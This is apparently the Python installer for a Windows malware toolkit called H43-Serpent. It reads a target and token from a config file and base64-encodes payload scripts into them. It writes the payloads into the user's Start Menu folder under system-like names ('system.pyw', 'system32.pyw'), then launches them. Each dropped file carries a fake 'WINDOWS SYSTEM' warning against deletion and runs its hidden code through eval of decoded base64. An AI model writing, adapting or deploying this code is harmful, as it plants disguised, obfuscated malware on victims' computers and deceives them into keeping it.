'''
Author: Fytex
REPO: https://github.com/Fytex/H43-Serpent
'''


import os
import sys
import pip
import base64
import ctypes
import importlib
import configparser


from ctypes import wintypes

MAIN = 'system'
LIB = 'system32'

SCRIPTS_FOLDER = 'scripts\\'
MAIN_SCRIPT_NAME = MAIN + '.pyw'
LIB_SCRIPT_NAME = LIB + '.pyw'



# Define constants used by the SHGetFolderPath function
CSIDL_STARTMENU = 7
SHGFP_TYPE_CURRENT = 0

# Load the shell32.dll library
shell32 = ctypes.WinDLL('shell32')

# Define the SHGetFolderPath function signature
SHGetFolderPath = shell32.SHGetFolderPathW
SHGetFolderPath.argtypes = [
    wintypes.HWND,
    ctypes.c_int,
    wintypes.HANDLE,
    wintypes.DWORD,
    wintypes.LPWSTR
]

# Call the SHGetFolderPath function to get the path to the Start Menu folder
path_buf = ctypes.create_unicode_buffer(wintypes.MAX_PATH)
result = SHGetFolderPath(None, CSIDL_STARTMENU, None, SHGFP_TYPE_CURRENT, path_buf)

if result != 0:
    print('Couldn\'t find Start Menu')
    exit()

#d = os.environ['AppData'] + r"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
d = path_buf.value + '\\'


config = configparser.ConfigParser()
config.read('config.ini')
TARGET = config['CONFIGS']['TARGET']
TOKEN = config['CONFIGS']['TOKEN']


file_base64_content = '''\'\'\'
WINDOWS SYSTEM

[Warning]
Deleting this system\'s file can make your computer malfunction.
Action is irreversible.
\'\'\'


import base64
eval(compile(base64.b64decode({}),\'<string>\',\'exec\'))
'''


with open(SCRIPTS_FOLDER + MAIN_SCRIPT_NAME) as from_file:
    TARGET_VAR = from_file.readline().split('=')[0]
    TOKEN_VAR = from_file.readline().split('=')[0]
    LIB_VAR = from_file.readline().split('=')[0]

    
    replacement_line = f'{TARGET_VAR}= \'{TARGET}\'\n{TOKEN_VAR}= \'{TOKEN}\'\n{LIB_VAR}= \'{LIB}\'\n'
    text = replacement_line + from_file.read()
    encoded = base64.b64encode(text.encode())

    
with open(d + MAIN_SCRIPT_NAME, 'w') as to_file:  
    to_file.write(file_base64_content.format(encoded))




with open(SCRIPTS_FOLDER + LIB_SCRIPT_NAME) as from_file:
    text = from_file.read()
    encoded = base64.b64encode(text.encode())
        
with open(d + LIB_SCRIPT_NAME, 'w') as to_file:  
    to_file.write(file_base64_content.format(encoded))



os.chdir(d)
sys.path.insert(0, d)

importlib.import_module(MAIN_SCRIPT_NAME)



